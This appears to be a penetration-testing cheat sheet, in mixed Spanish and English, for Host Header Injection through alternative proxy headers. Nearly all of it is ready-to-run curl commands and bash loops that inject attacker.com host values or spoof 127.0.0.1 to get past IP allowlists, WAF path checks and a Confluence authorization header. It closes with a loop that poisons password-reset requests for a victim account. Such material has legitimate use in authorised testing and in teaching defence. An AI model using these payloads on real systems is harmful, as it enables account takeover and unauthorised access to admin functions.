---
aliases:
  - X-Forwarded-Host
  - X-Original-URL
  - Forwarded RFC 7239
  - X-HTTP-Host-Override
tags:
  - vuln/host-header-injection
  - technique/initial-access
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Host Header Injection]]"
---
# Host Header Injection - Headers Alternativos

***

## `X-Forwarded-Host` (XFH)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -H "X-Forwarded-Host: attacker.com" https://target/` | Backend trusts XFH > Host → URL construction usa attacker | Reverse proxy convention. |
| `curl -H "X-Forwarded-Host: attacker.com:443" https://target/` | XFH con port custom | Port routing differential. |
| `curl -H "X-Forwarded-Host: a.com, b.com" https://target/` | Multiple values comma-separated | First/last wins varies. |
| `curl -H "Host: target.com" -H "X-Forwarded-Host: attacker.com" -H "X-Forwarded-Proto: https" https://target/` | Combo paired headers para URL construct | Backend builds URL from XFH+XFP. |
| `curl -H "X-Forwarded-Host: attacker.com" -H "X-Forwarded-For: 10.0.0.1" https://target/` | Spoof IP allowlist + XFH combo | Trusted-IP-only XFH bypass. |
| `curl -H "X-Forwarded-Host: target.com.attacker.com" https://target/` | Suffix bypass de validation | Validator naive. |
^hhi-altheader-xfh

___

## `X-Forwarded-For` (XFF) y `X-Real-IP`

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -H "X-Forwarded-For: 127.0.0.1" https://target/admin` | IP allowlist bypass — internal trust | Backend trusts XFF para auth. |
| `curl -H "X-Forwarded-For: 169.254.169.254" https://target/api/x` | Cloud metadata IP spoof | App reads XFF para fetch routing. |
| `curl -H "X-Forwarded-For: a.com, attacker.com, internal" https://target/` | Multiple XFF — first/last wins | Differential parsing. |
| `curl -H "X-Real-IP: 127.0.0.1" https://target/admin` | Same vector vía X-Real-IP | nginx convention. |
| `curl -H "Client-IP: 127.0.0.1" https://target/admin` | Client-IP variant | Edge. |
| `curl -H "True-Client-IP: 127.0.0.1" https://target/admin` | Akamai-style header | Akamai-fronted. |
| `curl -H "Cluster-Client-IP: 127.0.0.1" https://target/admin` | Internal cluster header | Edge. |
| `curl -H "X-Originating-IP: 127.0.0.1" https://target/admin` | Less common | Edge. |
| `curl -H "Cf-Connecting-IP: 127.0.0.1" https://target/admin` | Cloudflare-specific | Bypass si CF no strip. |
| `for h in 'X-Forwarded-For' 'X-Real-IP' 'Client-IP' 'True-Client-IP' 'Cluster-Client-IP' 'X-Originating-IP' 'Cf-Connecting-IP' 'Fastly-Client-IP'; do curl -sI -H "$h: 127.0.0.1" https://target/admin \| head -1; done` | Bulk IP-spoof header probe | Discovery. |
^hhi-altheader-xff

___

## `X-Forwarded-Server`

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -H "X-Forwarded-Server: attacker.com" https://target/` | XFS-based Host injection | Apache mod_proxy chain. |
| `curl -sI -H "X-Forwarded-Server: x" https://target/ \| grep -i 'x-forwarded-server'` | Reflection check | Pre-attack probe. |
| `curl -H "Host: target.com" -H "X-Forwarded-Server: internal-server" https://target/` | Internal server disclosure via reflection | Apache stack. |
| `curl -H "X-Forwarded-Server: attacker.com" -H "X-Forwarded-Host: attacker.com" https://target/` | Combo con XFH | Multi-header confusion. |
^hhi-altheader-xfs

___

## `X-HTTP-Host-Override` / `X-Host`

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -H "X-HTTP-Host-Override: attacker.com" https://target/` | Direct Host override custom | App con custom override header. |
| `curl -H "X-Host: attacker.com" https://target/` | X-Host variant | Frequent en custom apps. |
| `curl -H "Forwarded: host=attacker.com" https://target/` | RFC 7239 standard syntax | Modern apps Spring 5.1+. |
| `curl -H "Forwarded: host=a;proto=https, host=b" https://target/` | Multiple proxies en chain syntax | Chain ambiguity. |
| `for h in 'X-HTTP-Host-Override' 'X-Host' 'X-Forwarded-Host' 'X-Forwarded-Server' 'X-Original-Host' 'Forwarded'; do curl -sI -H "$h: attacker.com" https://target/ \| head -1; done` | Bulk override-header probe | Discovery. |
^hhi-altheader-host-override

___

## `X-Original-URL` / `X-Rewrite-URL`

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -H "X-Original-URL: /admin" https://target/` | Path override → backend procesa /admin mientras URI line es / | IIS-specific WAF bypass. |
| `curl -H "X-Rewrite-URL: /admin" https://target/` | Variant del path override | Same effect. |
| `curl -H "X-Custom-IP-Authorization: 127.0.0.1" https://target/admin` | Atlassian/Confluence CVE bypass | Confluence apps. |
| `curl -H "X-Original-URL: /admin" -H "X-HTTP-Method-Override: GET" https://target/` | Combo path + method override | Compound bypass. |
| `curl -H "X-Original-URL: /admin" -H "X-Forwarded-Host: attacker.com" https://target/` | Combo host + path | HHI compound. |
| `for h in 'X-Original-URL' 'X-Rewrite-URL' 'X-Forwarded-URL' 'X-Original-Path' 'X-Custom-IP-Authorization'; do curl -sI -H "$h: /admin" https://target/ \| head -1; done` | Bulk path-override probe | Discovery. |
^hhi-altheader-original

___

## `Forwarded:` (RFC 7239)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -H "Forwarded: host=attacker.com" https://target/` | Host injection RFC 7239 syntax | Modern apps. |
| `curl -H "Forwarded: for=127.0.0.1" https://target/admin` | IP spoof via Forwarded | IP-based ACL bypass. |
| `curl -H "Forwarded: proto=https" https://target/` | Force scheme | Scheme-based logic. |
| `curl -H "Forwarded: by=lb1;for=127.0.0.1;host=attacker.com;proto=https" https://target/` | Full RFC syntax con todos params | Compound injection. |
| `curl -H 'Forwarded: host="attacker.com"' https://target/` | Quoted values (RFC permits) | Parser differential. |
| `curl -H "Forwarded: for=a, for=b, for=c" https://target/` | Multiple proxies chain | First/last wins. |
| `curl -H "Forwarded: host=attacker%2Ecom" https://target/` | Encoded values | Bypass naive validation. |
^hhi-altheader-rfc7239

### Multi-header probe combo

```bash
HEADERS=(
  'X-Forwarded-Host: attacker.com'
  'X-Forwarded-Server: attacker.com'
  'X-HTTP-Host-Override: attacker.com'
  'X-Host: attacker.com'
  'X-Forwarded-For: 127.0.0.1'
  'Forwarded: host=attacker.com'
  'X-Original-URL: /admin'
  'X-Rewrite-URL: /admin'
)

for h in "${HEADERS[@]}"; do
  echo "=== $h ==="
  curl -s -X POST -H "Host: target.com" -H "$h" \
    -d 'email=victim@target.com' https://target.com/forgot | head -c 200
done
```

***
